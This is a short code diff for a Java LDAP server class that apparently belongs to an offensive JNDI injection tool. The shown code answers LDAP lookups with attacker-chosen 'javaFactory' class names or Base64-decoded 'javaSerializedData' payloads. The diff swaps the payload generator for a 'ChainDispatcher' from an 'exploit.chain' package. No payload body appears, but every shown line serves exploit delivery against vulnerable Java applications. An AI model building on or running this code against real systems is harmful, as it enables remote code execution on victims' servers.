@@ -1,7 +1,6 @@
 package com.bloom.server;
 
 import com.bloom.Template.CommandTemplate;
-import com.bloom.exploit.payload;
 import com.bloom.parser.ParsedRoute;
 import com.bloom.parser.RouteParser;
 import com.bloom.session.VerificationSession;
@@ -22,7 +21,7 @@ import javax.net.ssl.SSLSocketFactory;
 import java.net.InetAddress;
 import java.net.URL;
 
-import static com.bloom.exploit.payload.choiceMethod;
+import com.bloom.exploit.chain.ChainDispatcher;
 import static com.bloom.util.Functions.getRandomString;
 import static com.bloom.util.Functions.ipCheck;
 
@@ -102,7 +101,7 @@ public class LdapServer extends InMemoryOperationInterceptor {
                 e.addAttribute("javaFactory", className);
                 payloadResult = className;
             } else {
-                String s = payload.choiceTypeByswitch(base);
+                String s = ChainDispatcher.generate(route);
                 try {
                     e.addAttribute("javaSerializedData", Base64.decode(s));
                     payloadResult = s;
